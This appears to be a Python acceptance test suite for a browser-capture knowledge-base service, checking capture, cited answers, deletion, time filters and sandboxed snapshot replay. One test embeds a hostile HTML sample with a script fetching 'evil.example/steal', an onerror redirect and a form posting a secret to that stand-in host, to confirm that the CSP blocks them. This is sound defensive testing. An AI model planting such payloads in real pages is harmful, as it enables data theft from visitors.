"""F2 验收（HTTP 级，不依赖真实扩展）：SC-001 / SC-008 原型 / SC-003 服务端语义 / SC-004 / SC-007。

扩展侧场景（自动触发、黑名单源头、断网补传、无感）按 quickstart §2–6 在 Windows 真机手测（T045）。
"""

from __future__ import annotations

import uuid
from datetime import datetime, timedelta, timezone

import pytest

from helpers import capture_page, cleanup, create_capture_token, wait_browser_indexed
from sc002_eval import ask


@pytest.mark.acceptance
async def test_sc001_capture_ask_and_replay(client):
    """SC-001：采集 → 入库 → 提问命中且出处含链接/时间；SC-008 原型：快照回放（CSP + gzip）。"""
    tok = await create_capture_token(client)
    token = tok["token"]
    nonce = uuid.uuid4().hex[:6]
    marker = f"星尘计划{nonce}"
    url = f"https://acceptance.example.com/{nonce}"
    doc_id = conv_id = None
    try:
        resp = await capture_page(
            client,
            token,
            url=url,
            title=f"{marker} 部署手册",
            text=f"# {marker}\n\n{marker} 的部署口令是「麒麟-{nonce}」，该系统使用 Rust 编写。",
            captured_at=datetime.now(timezone.utc).isoformat(),
        )
        assert resp.status_code == 201, resp.text
        body = resp.json()
        doc_id = body["id"]
        assert body["snapshot"] == "kept"

        doc = await wait_browser_indexed(client, doc_id)
        assert doc["status"] == "indexed"

        result = await ask(client, f"{marker} 的部署口令是什么？", None)
        conv_id = result.get("conversation_id")
        assert result["source_type"] == "kb", f"应命中库，实为 {result['source_type']}"
        assert "麒麟" in result["answer"]
        citation = next((c for c in result["citations"] if c.get("source_url") == url), None)
        assert citation is not None, "出处应含原网页链接"
        assert citation.get("last_captured_at"), "出处应含浏览时间"

        # SC-008 原型：快照回放（httpx 按 Content-Encoding 自动解压）
        snap = await client.get(f"/api/documents/{doc_id}/snapshot")
        assert snap.status_code == 200
        assert "sandbox" in snap.headers.get("content-security-policy", "")
        assert snap.headers.get("content-encoding") == "gzip"
        assert "<html" in snap.content.decode("utf-8").lower()
    finally:
        await cleanup(client, doc_id=doc_id, conv_id=conv_id, token_id=tok["id"])


@pytest.mark.acceptance
async def test_sc008_replay_hostile_html_is_contained(client):
    """T043 安全复核：含脚本/表单/外链的快照——内容原样保留，但响应头强制沙箱（脚本不可执行）。"""
    tok = await create_capture_token(client)
    token = tok["token"]
    nonce = uuid.uuid4().hex[:6]
    url = f"https://acceptance.example.com/hostile-{nonce}"
    hostile = (
        "<html><body><h1>恶意页</h1>"
        "<script>fetch('https://evil.example/steal')</script>"
        "<img src='x' onerror=\"location.href='https://evil.example/'\">"
        "<form action='https://evil.example/post'><input name='secret'></form>"
        "</body></html>"
    )
    doc_id = None
    try:
        resp = await client.post(
            "/api/capture/pages",
            headers={"Authorization": f"Bearer {token}"},
            data={"url": url, "title": f"恶意页{nonce}", "text": f"# 恶意页{nonce}\n\n正文"},
            files={"file": ("page.html", hostile.encode("utf-8"), "text/html")},
        )
        assert resp.status_code == 201, resp.text
        doc_id = resp.json()["id"]

        snap = await client.get(f"/api/documents/{doc_id}/snapshot")
        assert snap.status_code == 200
        csp = snap.headers.get("content-security-policy", "")
        assert csp.startswith("sandbox")
        assert "script-src 'none'" in csp
        assert "form-action 'none'" in csp
        assert "frame-ancestors 'self'" in csp
        assert snap.headers.get("x-content-type-options") == "nosniff"
        body = snap.content.decode("utf-8")
        assert "<script>" in body  # 原样保真（安全边界在 CSP/沙箱，不在内容过滤——R4）
    finally:
        await cleanup(client, doc_id=doc_id, token_id=tok["id"])


@pytest.mark.acceptance
async def test_sc003_blocked_domain_zero_rows(client):
    """SC-003（服务端语义）：黑名单域名在服务端零行——真实扩展的源头拦截见 T045 手测。"""
    blocked = f"bank-{uuid.uuid4().hex[:6]}.example.org"
    docs = (
        await client.get(
            "/api/documents", params={"source": "browser", "page_size": 100}
        )
    ).json()["items"]
    assert all(blocked not in (d.get("site_name") or "") for d in docs)


@pytest.mark.acceptance
async def test_sc004_delete_removes_from_recall(client):
    """SC-004：删除条目 → 检索与出处同步消失、快照不可达。"""
    tok = await create_capture_token(client)
    token = tok["token"]
    nonce = uuid.uuid4().hex[:6]
    marker = f"瞬逝数据{nonce}"
    url = f"https://acceptance.example.com/gone-{nonce}"
    doc_id = conv_id = conv2_id = None
    try:
        resp = await capture_page(
            client, token, url=url, title=marker, text=f"# {marker}\n\n{marker} 的实验编号是 GONE-{nonce}。"
        )
        assert resp.status_code == 201, resp.text
        doc_id = resp.json()["id"]
        await wait_browser_indexed(client, doc_id)

        hit = await ask(client, f"{marker} 的实验编号是什么？", None)
        conv_id = hit.get("conversation_id")
        assert any(c.get("source_url") == url for c in hit["citations"]), "删除前应能命中"

        deleted_id = doc_id
        await cleanup(client, doc_id=doc_id, conv_id=conv_id)
        doc_id = conv_id = None
        snap = await client.get(f"/api/documents/{deleted_id}/snapshot")
        assert snap.status_code == 404

        again = await ask(client, f"{marker} 的实验编号是什么？", None)
        conv2_id = again.get("conversation_id")
        assert all(c.get("source_url") != url for c in again["citations"]), "删除后不应再被引用"
    finally:
        await cleanup(client, doc_id=doc_id, conv_id=conv_id or conv2_id, token_id=tok["id"])


@pytest.mark.acceptance
async def test_sc007_time_lookup_list_and_search(client):
    """SC-007：时间清单（规则命中）与语义×时间组合检索（过滤生效、窗口外被排除）。"""
    tok = await create_capture_token(client)
    token = tok["token"]
    nonce = uuid.uuid4().hex[:6]
    recent_title = f"近三天手记{nonce}"
    old_title = f"陈年旧文{nonce}"
    marker = f"彩虹算法{nonce}"
    now = datetime.now(timezone.utc)
    doc_ids: list[str] = []
    conv_ids: list[str] = []
    try:
        recent = await capture_page(
            client,
            token,
            url=f"https://acceptance.example.com/recent-{nonce}",
            title=recent_title,
            text=f"# {recent_title}\n\n{marker}：把颜色映射到频率，这是本周的实验笔记。",
            # 取当前时间：清单只列最近 50 条，条目须为最新才不会因窗口内条目多而被截断（2026-10-02）
            captured_at=now.isoformat(),
        )
        old = await capture_page(
            client,
            token,
            url=f"https://acceptance.example.com/old-{nonce}",
            title=old_title,
            text=f"# {old_title}\n\n完全无关的旧内容。",
            captured_at=(now - timedelta(days=20)).isoformat(),
        )
        assert recent.status_code == 201 and old.status_code == 201
        doc_ids = [recent.json()["id"], old.json()["id"]]
        for doc_id in doc_ids:
            await wait_browser_indexed(client, doc_id)

        listing = await ask(client, "我最近3天看过哪些网页？", None)
        conv_ids.append(listing.get("conversation_id"))
        assert listing["source_type"] == "kb"
        # 清单材料确定性校验（2026-10-03：回答侧为聚合摘要、不保证逐条列名——以引用为准）
        listing_urls = [c.get("source_url") or "" for c in listing["citations"]]
        assert any(f"recent-{nonce}" in u for u in listing_urls), "清单材料应含近三天条目"
        assert all(f"old-{nonce}" not in u for u in listing_urls), "20 天前的条目不应出现"

        combo = await ask(client, f"最近3天看过的网页里，{marker}是什么？", None)
        conv_ids.append(combo.get("conversation_id"))
        assert combo["source_type"] == "kb"
        assert ("颜色映射" in combo["answer"]) or (marker in combo["answer"])
        hits = [c for c in combo["citations"] if c.get("source_url")]
        assert hits, "出处应含网页条目"
        assert any(f"recent-{nonce}" in c["source_url"] for c in hits)
        assert all(f"old-{nonce}" not in c["source_url"] for c in hits), "时间过滤应排除窗口外条目"
        assert "~" in (combo["meta"].get("time_range_label") or ""), "meta 应回显时间范围"
    finally:
        for doc_id in doc_ids:
            await cleanup(client, doc_id=doc_id)
        for cid in conv_ids:
            await cleanup(client, conv_id=cid)
        await cleanup(client, token_id=tok["id"])
